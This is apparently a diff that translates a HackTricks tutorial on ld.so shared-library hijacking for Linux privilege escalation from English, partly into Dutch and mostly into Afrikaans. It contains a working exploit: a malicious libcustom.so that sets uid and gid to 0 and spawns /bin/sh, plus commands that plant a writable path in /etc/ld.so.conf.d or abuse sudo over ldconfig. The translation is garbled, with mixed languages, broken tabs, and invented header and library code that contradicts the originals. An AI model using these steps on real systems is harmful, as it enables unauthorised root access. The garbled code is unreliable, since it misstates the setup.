@@ -1,22 +1,22 @@
-# ld.so privesc exploit example
+# ld.so privesc uitbuiting voorbeeld
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere manieren om HackTricks te ondersteunen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
+* Koop de [**officiële PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
+* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
 
-## Prepare the environment
+## Bereid de omgeving voor
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+In de volgende sectie vind je de code van de bestanden die we gaan gebruiken om de omgeving voor te bereiden
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -25,65 +25,90 @@ In the following section you can find the code of the files we are going to use 
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
-{% endtab %}
-
 {% tab title="libcustom.h" %}
+
+Hierdie lêer definieer die funksies en strukture vir die `libcustom` biblioteek.
+
+```c
+#ifndef LIBCUSTOM_H
+#define LIBCUSTOM_H
+
+#include <stdio.h>
+
+// Funksie om 'n boodskap na die skerm te druk
+void print_message(const char* message);
+
+// Funksie om twee getalle op te tel
+int add_numbers(int a, int b);
+
+#endif /* LIBCUSTOM_H */
+```
+
+{% endtab %}
 ```c
 #include <stdio.h>
 
 void vuln_func();
 ```
-{% endtab %}
-
 {% tab title="libcustom.c" %}
+
+Hier is 'n voorbeeld van 'n eenvoudige C-program wat 'n aangepaste biblioteek, libcustom.so, gebruik:
+
+```c
+#include <stdio.h>
+
+void custom_function() {
+    printf("Hierdie is 'n aangepaste funksie in die libcustom.so biblioteek.\n");
+}
+```
+
+Hierdie program bevat 'n enkele funksie, `custom_function()`, wat 'n eenvoudige boodskap na die uitvoer skryf. Hierdie funksie sal gebruik word in die volgende voorbeeld om die priviligie-escalasie te demonstreer.
+
+{% endtab %}
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
+{% tabs %}
+{% tab title="Afrikaans" %}
+1. **Skep** daardie lêers op jou rekenaar in dieselfde vouer
+2. **Kompileer** die **biblioteek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Kopieer** `libcustom.so` na `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
+4. **Kompileer** die **uitvoerbare lêer**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+
+### Kontroleer die omgewing
+
+Kontroleer dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre lêer kan **uitvoer**.
 {% endtab %}
 {% endtabs %}
-
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
-
-### Check the environment
-
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
-	
-$ ./sharedvuln 
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+
+$ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
+## Uitbuiting
 
-## Exploit
-
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+In hierdie scenario gaan ons aanneem dat **iemand 'n kwesbare inskrywing geskep het** binne 'n lêer in _/etc/ld.so.conf/_:
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+Die kwesbare gids is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
+**Laai die volgende kode af en stel dit saam** binne daardie pad:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -92,91 +117,82 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+Nou dat ons die kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde pad geskep het, moet ons wag vir 'n herlaai of vir die root-gebruiker om `ldconfig` uit te voer (as jy hierdie binêre lêer as `sudo` kan uitvoer of as dit die `suid-bit` het, sal jy dit self kan uitvoer).
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+Sodra dit gebeur het, **herkontroleer** waar die `sharevuln` uitvoerbare lêer die `libcustom.so`-biblioteek laai vanaf:
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+Soos u kan sien, laai dit dit vanaf `/home/ubuntu/lib` en as enige gebruiker dit uitvoer, sal 'n skulp uitgevoer word:
 ```c
-$ ./sharedvuln 
+$ ./sharedvuln
 Welcome to my amazing application!
 I'm the bad library
 $ whoami
 ubuntu
 ```
-
 {% hint style="info" %}
-Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+Let wel dat ons in hierdie voorbeeld nie voorregte verhoog het nie, maar deur die opdragte wat uitgevoer word te wysig en **te wag vir die root- of ander bevoorregte gebruiker om die kwesbare binêre lêer uit te voer**, sal ons in staat wees om voorregte te verhoog.
 {% endhint %}
 
-### Other misconfigurations - Same vuln
+### Ander verkeerde konfigurasies - Dieselfde kwesbaarheid
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+In die vorige voorbeeld het ons 'n verkeerde konfigurasie vervals waar 'n administrateur **'n nie-bevoorregte vouer binne 'n konfigurasie-lêer binne `/etc/ld.so.conf.d/`** ingestel het.\
+Maar daar is ander verkeerde konfigurasies wat dieselfde kwesbaarheid kan veroorsaak, as jy **skryfregte** het in 'n **konfigurasie-lêer** binne `/etc/ld.so.conf.d`, in die vouer `/etc/ld.so.conf.d` of in die lêer `/etc/ld.so.conf`, kan jy dieselfde kwesbaarheid konfigureer en uitbuit.
 
-## Exploit 2
+## Uitbuiting 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**Stel dat jy sudo-voorregte het oor `ldconfig`**.\
+Jy kan `ldconfig` aandui **waar om die konf-lêers vanaf te laai**, sodat ons dit kan benut om `ldconfig` willekeurige vouers te laat laai.\
+So, laat ons die lêers en vouers skep wat nodig is om "/tmp" te laai:
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+Nou, soos aangedui in die **vorige uitbuit**, **skep die skadelike biblioteek binne `/tmp`**.\
+En uiteindelik, laai die pad en kyk waar die binêre lading die biblioteek vandaan:
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**Soos u kan sien, kan u dieselfde kwesbaarheid uitbuit deur sudo-voorregte oor `ldconfig` te hê.**
 
 {% hint style="info" %}
-I **didn't find** a reliable way to exploit this vuln if `ldconfig` is configured with the **suid bit**. The following error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
+Ek **het nie** 'n betroubare manier gevind om hierdie kwesbaarheid uit te buit as `ldconfig` gekonfigureer is met die **suid-bit**. Die volgende fout verskyn: `/sbin/ldconfig.real: Kan nie tydelike kaslêer /etc/ld.so.cache~ skep nie: Toestemming geweier`
 {% endhint %}
 
-## References
+## Verwysings
 
 * [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
 * [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
-* Dab machine in HTB
+* Dab-masjien in HTB
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As u u **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel u haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
